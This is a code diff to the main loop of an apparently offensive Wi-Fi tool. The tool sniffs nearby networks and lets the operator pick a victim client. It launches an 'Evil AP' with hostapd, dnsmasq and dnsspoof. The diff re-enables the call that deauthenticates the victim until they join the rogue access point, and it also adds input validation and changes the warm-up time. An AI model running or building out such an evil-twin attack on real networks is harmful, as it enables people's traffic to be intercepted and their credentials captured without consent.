@@ -45,7 +45,7 @@ def main():
     sniffer = scan.start_sniff(iface)
 
     # Warm-up phase: 60 seconds
-    warmup = 10
+    warmup = 60
     print(f"Gathering data for {warmup}s before menu...")
     time.sleep(warmup)
 
@@ -73,9 +73,9 @@ def main():
                 sub = input("Select client index, 'b' to go back:").strip().lower()
                 if sub == 'b':
                     break
-                # if not sub.isdigit() or int(sub) not in range(len(clients)):
-                #     print("Invalid choice.")
-                #     continue
+                if not sub.isdigit() or int(sub) not in range(len(clients)):
+                    print("Invalid choice.")
+                    continue
 
                 client_mac = list(clients.keys())[int(sub)]
                 print(f"\nSelected AP: {ap_info['SSID']} ({bssid})")
@@ -85,11 +85,12 @@ def main():
                 # Capture the process handles so you can shut them down cleanly later
                 
                 print("Starting hostapd/dnsmasq/dnsspoof…")
-                procs = attack.start_attack(ap_iface)
+                procs = attack.start_attack(ap_iface, ap_info)
 
                 # # 4) Deauth the victim until they associate to your Evil AP
-                # attack.deauth_victim({'BSSID': bssid}, client_mac, iface)
+                attack.deauth_victim({'BSSID': bssid}, client_mac, iface)
                 print(f"Deauthenticating {client_mac} from {bssid}…")
+
                 # 5) Stop sniffing now that the victim is “in”
                 scan.stop_sniff.set()
                 sniffer.join()
